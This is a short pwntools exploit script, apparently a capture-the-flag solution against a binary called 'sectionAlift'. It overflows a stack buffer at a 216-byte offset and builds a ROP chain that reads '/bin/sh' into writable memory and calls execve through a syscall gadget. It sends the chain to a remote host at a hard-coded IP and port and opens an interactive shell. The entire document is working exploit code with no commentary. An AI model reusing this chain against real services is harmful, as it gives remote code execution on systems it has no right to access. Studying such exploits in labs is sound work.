from pwn import *

elf = context.binary = ELF('./sectionAlift')
context.log_level = 'debug'
context.terminal = 'kitty'

writable = 0x49f0b0

pop_rdx_rbx = 0x000000000045f997 # pop rdx ; pop rbx

offset = 216

rop = ROP(elf)
rop.raw(b'A' * offset)
rop.call(elf.sym.read, [0, writable, 0x200])

rop.raw(rop.find_gadget(['pop rax', 'ret'])[0])
rop.raw(59)
rop.raw(rop.find_gadget(['pop rdi', 'ret'])[0])
rop.raw(writable)
rop.raw(rop.find_gadget(['pop rsi', 'ret'])[0])
rop.raw(0)
rop.raw(0x000000000045f997) # pop rdx ; pop rbx
rop.raw(0)
rop.raw(0)
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

print(rop.dump())

# p = process()
p = remote('34.87.71.105', 21001)

p.sendlineafter('>>', rop.chain())
p.sendline('/bin/sh\x00')

p.interactive()
